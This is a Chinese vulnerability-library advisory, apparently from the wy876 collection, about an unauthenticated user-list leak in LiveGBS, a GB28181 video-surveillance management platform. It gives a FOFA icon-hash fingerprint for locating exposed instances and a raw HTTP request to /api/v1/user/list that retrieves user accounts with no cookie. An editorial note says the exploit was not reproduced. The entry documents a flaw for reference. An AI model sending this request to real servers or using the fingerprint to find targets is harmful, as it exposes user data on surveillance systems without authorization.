---
source: "wy876 漏洞文库"
id: "vw-c96c1b40081d5039f54b09d3"
entity_id: "ve-c96c1b40081d5039f54b09d3"
schema_version: "1"
fofa_unverified: "icon_hash="
title: "LiveGBS list存在信息泄漏漏洞"
product: "LiveGBS"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无cookie请求，软件版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/LiveGBS/LiveGBSlist%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ongy3487szmdw9ti"
source_status: "recorded"
---

# LiveGBS list存在信息泄漏漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：LiveGBS
- 本文讨论：api/v1/user/list未授权数据候选
- 版本、权限与配置前提：无cookie请求，软件版本未知
- 资料类型：用户列表信息泄露摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 无响应字段/权限对照；用户名列表是否敏感程度未界定
- fofa残缺，无固定版和厂商公告
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 数据敏感性、默认配置及版本待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
LiveGBS是一款基于GB28181协议的安防监控软件，专为集中统一管理和观看所有摄像头、硬盘录像机等设备而设计。它支持GB28181注册接入，可向上级联第三方国标平台，提供可视化的WEB页面管理，使用户能够轻松实现设备的远程监控和管理。LiveGBS具备多项强大功能，包括云台控制、设备录像检索与回放、语音对讲、用户管理等。同时，它支持多种协议流输出，实现浏览器无插件直播，让用户能够随时随地通过Web端查看监控画面。LiveGBS list存在信息泄漏漏洞

# 二、影响版本
+ LiveGBS 

# 三、资产测绘
+ fofa`icon_hash="-206100324"`
+ 特征


# 四、漏洞复现
```http
GET /api/v1/user/list?q=&start=0&limit=100&enable=&sort=CreatedAt&order=desc HTTP/1.1
Host: 
Accept: */*
Accept-Encoding: gzip, deflate
sec-ch-ua: "Google Chrome";v="117", "Chromium";v="117", "Not=A?Brand";v="24"
sec-ch-ua-mobile: ?0
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua-platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ongy3487szmdw9ti>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
